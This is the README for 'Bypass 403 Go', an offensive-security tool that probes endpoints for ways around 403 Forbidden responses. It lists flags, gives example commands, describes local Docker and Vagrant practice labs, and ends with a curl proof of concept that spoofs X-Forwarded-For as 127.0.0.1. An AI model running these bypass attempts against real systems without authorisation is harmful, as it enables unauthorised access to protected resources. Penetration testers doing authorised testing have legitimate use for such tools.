# Bypass 403 Go

## Description

Bypass 403 Go is a tool designed to bypass 403 Forbidden responses for specific endpoints. It allows users to make HTTP requests to specified URLs and includes options for adding custom headers to the requests.

### Installation

```bash
go install github.com/elvisgraho/bypass-403-go@latest
```

### Flags

| Option      | Description                                    |
|-------------|------------------------------------------------|
| -**u**          | Target URL (mandatory), e.g., `-u https://example.com/admin` |
| -**h**          | User header, e.g., `-h 'Cookie: lol'`          |
| -**hfile**      | File containing user headers, with one header per line |
| -**fs**         | Suppresses output with the desired content length, `-fs 42,205` |
| -**fc**         | Suppresses output with the desired response code, `-fc 307` |
| -**fr**         | Filter specific message in the response, `-fr "Request unsuccessful."` |
| -**skipUrl**    | Skip attacks that change url.                  |
| -**skipMethod** | Skip attacks that change request method.       |
| -**skipAgent**  | Skip attacks that change Agent header.         |
| -**show400**    | Show all 400 errors.                           |
| -**t**          | Delay between requests, `-t 50ms`              |
| -**rt**         | Network timeout per request, `-rt 10s`         |

### Examples

```sh
bypass-403-go -u https://example.com/secret -h 'Cookie: lol'
bypass-403-go -u https://example.com/secret -hfile headers.txt
bypass-403-go -u https://example.com/secret -hfile headers.txt -fs 42
```

### Testing with Playground (local)

```sh
docker build -t 403-playground ./playground
docker run -p 8080:8080 403-playground
```

Once the playground is running, you can test the tool using commands similar to the following:

```sh
go run main.go -u "http://localhost:8080/admin" -h "Cookie: hello"
```

Playground output

```console
$ go run .\main.go -u "http://localhost:8080/admin" -h "Cookie: hello"
2024/03/15 16:03:38.692321 Started bypass-403-go
PUT <http://localhost:8080/admin> 200 OK. Length: 44.
GET <http://localhost:8080/admin> 200 OK. Length: 44. Cluster-Client-IP: localhost
GET <http://localhost:8080/admin> 200 OK. Length: 44. X-Forwarded-Port: 8080
2024/03/15 16:03:41.889985 Finished bypass-403-go
```

### Testing with Vagrant Lab

This repo also includes a more realistic local lab that runs the playground inside an Ubuntu VM with `nginx` in front of the Go service.

```sh
vagrant up
```

If your Vagrant installation defaults to VMware, this setup is compatible with:

```sh
vagrant up --provider vmware_desktop
```

By default, the VM bridges to the host adapter named `Ethernet` and gets a LAN IP from DHCP. You can override the adapter name if needed:

```sh
VAGRANT_BRIDGE=Ethernet vagrant up
```

Once provisioning finishes:

- Target app: `http://localhost:8080/admin`
- Dashboard: `http://localhost:8080/dashboard`
- JSON attempt feed: `http://localhost:8080/api/attempts`

The VM should also receive an address on your local network, typically in the same `192.168.178.0/24` range as your host.

Example:

```sh
go run main.go -u "http://localhost:8080/admin"
```

The dashboard shows recent requests, status codes, matched routes, user agents, key headers, and the bypass reason that was triggered.

### Create POC curl

```sh
curl -X GET \
  -H "X-Forwarded-For: 127.0.0.1:80" \
  -i "https://target.com/secret"
```
